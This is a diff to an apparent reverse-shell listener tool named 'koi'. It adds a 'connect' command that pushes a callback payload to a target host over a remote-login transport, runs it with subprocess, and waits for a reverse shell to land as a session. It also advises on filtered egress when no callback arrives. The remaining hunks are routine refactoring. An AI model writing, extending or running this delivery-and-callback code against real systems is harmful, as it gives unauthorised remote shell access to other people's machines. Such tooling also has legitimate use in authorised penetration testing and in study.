@@ -6,6 +6,7 @@ import select
 import shutil
 import signal
 import socket
+import subprocess
 import sys
 import threading
 import time
@@ -25,8 +26,11 @@ from koi.utils.cli import (
     SCREENABLE_SENTINEL,
     TOGGLE_SENTINEL,
 )
+from koi.utils.connect import TRANSPORTS, get_transport
 from koi.utils.powerupgrade import upgrade_windows_conptyshell
 from koi.utils.interact import interact
+from koi.utils.payloads import linux_callback_script
+from koi.utils.tcp import get_local_ip
 from koi.modules.loader import load_modules, get_module
 from koi.session import Session
 from koi.utils.ui import (
@@ -52,6 +56,8 @@ _ACCEPT_TIMEOUT = 1.0
 _SHORT_SLEEP = 0.15
 _MEDIUM_SLEEP = 0.2
 _LONG_SLEEP = 0.5
+_CONNECT_WAIT = 8.0
+_CONNECT_POLL = 0.1
 
 
 class _MaskBinary:
@@ -206,7 +212,8 @@ class Listener:
                 continue
 
             if pending is not None:
-                os_type = self._pending_conpty.pop(addr[0])[0]
+                self._pending_conpty.pop(addr[0], None)
+                os_type = pending[0]
                 staging = Session(id=-1, conn=conn, addr=addr)
                 staging.os_type = os_type
                 with self._conpty_lock:
@@ -361,22 +368,12 @@ class Listener:
             if not raw:
                 continue
 
-            if raw == SCREENABLE_SENTINEL:
-                import readline as _rl
-                try:
-                    _rl.remove_history_item(_rl.get_current_history_length() - 1)
-                except Exception:
-                    pass
-                self._toggle_screenable()
-                continue
-
-            if raw == TOGGLE_SENTINEL:
-                import readline as _rl
-                try:
-                    _rl.remove_history_item(_rl.get_current_history_length() - 1)
-                except Exception:
-                    pass
-                self._toggle_accepting()
+            if raw in (SCREENABLE_SENTINEL, TOGGLE_SENTINEL):
+                self._scrub_last_history()
+                if raw == SCREENABLE_SENTINEL:
+                    self._toggle_screenable()
+                else:
+                    self._toggle_accepting()
                 continue
 
             parts = tokenize(raw)
@@ -406,6 +403,98 @@ class Listener:
 
         mod_name = parts[1]
         self._cmd_run(mod_name, parts[2], parts[3:])
+
+    def _cmd_connect(self, argv: list[str]) -> None:
+        """Deliver a reverse shell over a transport, so it lands as an ordinary session.
+
+        The transport is only the delivery vector: the payload calls back to the
+        listener on its own socket, so the session outlives the delivering
+        command and needs no special casing anywhere else.
+        """
+        transport = get_transport(argv[0])
+        if transport is None:
+            supported = ", ".join(bold(name) for name in TRANSPORTS)
+            notify('error', f"Unknown transport {accent(argv[0])}, supported: {supported}.")
+            return
+
+        target = transport.parse(argv[1:])
+        if target is None:
+            notify('error', transport.usage)
+            return
+
+        try:
+            target_ip = socket.gethostbyname(target.host)
+        except OSError:
+            notify('error', f"Cannot resolve {accent(target.host)}.")
+            return
+
+        try:
+            local_ip = get_local_ip(target_ip)
+        except OSError:
+            notify('error', f"No route to {accent(self._mask_ip(target_ip))}.")
+            return
+
+        if not self._accepting:
+            notify('warning', f"Listener is {bold('paused')}, the callback would be refused.")
+            notify('status', muted(f"Run {bold('start')} first."))
+            return
+
+        if not transport.resolve_auth(target):
+            return
+
+        notify('info', f"Callback to {bold(self._mask_ip(local_ip, 'local'))}{muted(':')}{bold(self.port)}")
+        if self.screenable_mode:
+            # The transport inherits the real stdout, so _MaskStream never sees its prompts.
+            notify('warning', f"{transport.name} writes straight to the terminal, its output is not masked.")
+
+        known = {s.id for s in self._snapshot()}
+        cmd = transport.build_command(target, linux_callback_script(local_ip, self.port))
+        env = transport.env(target)
+
+        try:
+            returncode = subprocess.run(cmd, env=env).returncode
+        except FileNotFoundError:
+            notify('error', f"{accent(cmd[0])} is not installed on this machine.")
+            return
+        except KeyboardInterrupt:
+            print()
+            notify('warning', "Connection cancelled.")
+            return
+
+        if returncode != 0:
+            reason = transport.explain_exit(target, returncode)
+            notify('error', f"{transport.name} failed ({reason}), payload not delivered.")
+            return
+
+        landed = self._wait_for_callback(known)
+        if not landed:
+            notify('warning', f"No callback after {int(_CONNECT_WAIT)}s.")
+            notify('status', muted(
+                "The payload ran but nothing came back: egress from the target is likely "
+                "filtered, or it has neither python nor bash."
+            ))
+
+    def _wait_for_callback(self, known: set[int]) -> bool:
+        """Block until a session outside *known* shows up, or the wait runs out."""
+        with Spinner("Waiting for callback..."):
+            deadline = time.monotonic() + _CONNECT_WAIT
+            while time.monotonic() < deadline:
+                if any(s.id not in known for s in self._snapshot()):
+                    return True
+                time.sleep(_CONNECT_POLL)
+        return False
+
+    @staticmethod
+    def _scrub_last_history() -> None:
+        """Drop the line just typed from readline's history.
+
+        Keeps keybinding sentinels out of the scrollback.
+        """
+        import readline as _rl
+        try:
+            _rl.remove_history_item(_rl.get_current_history_length() - 1)
+        except Exception:
+            pass
 
     def _cmd_stop_accepting(self) -> None:
         if not self._accepting:
@@ -456,6 +545,10 @@ class Listener:
 
         if cmd == "run":
             self._dispatch_run(parts)
+            return True
+
+        if cmd == "connect":
+            self._cmd_connect(parts[1:])
             return True
 
         handlers = {
@@ -633,11 +726,13 @@ class Listener:
         logger = self._ensure_logger(sess)
         sess.attach_logger(logger)
         logger.log_event(f"enter {self._mask_ip(ip)}:{port}")
-        reason = interact(sess, logger=logger)
+        try:
+            reason = interact(sess, logger=logger)
+        finally:
+            self._in_session = False
+            signal.signal(signal.SIGWINCH, signal.SIG_DFL)
         logger.log_event(reason)
-        self._in_session = False
 
-        signal.signal(signal.SIGWINCH, signal.SIG_DFL)
         print()
         breaker_with_text()
 
@@ -742,6 +837,9 @@ class Listener:
         if tag is None:
             sess.tag = None
             notify('success', f"Tag cleared for session {accent(f'#{sess.id}')}.")
+            return
+        if tag.isdigit():
+            notify('error', f"Tag {accent(tag)!r} is numeric and would be unreachable (ids resolve first).")
             return
         conflict = next((s for s in self._snapshot() if s.tag == tag and s.id != sess.id), None)
         if conflict:
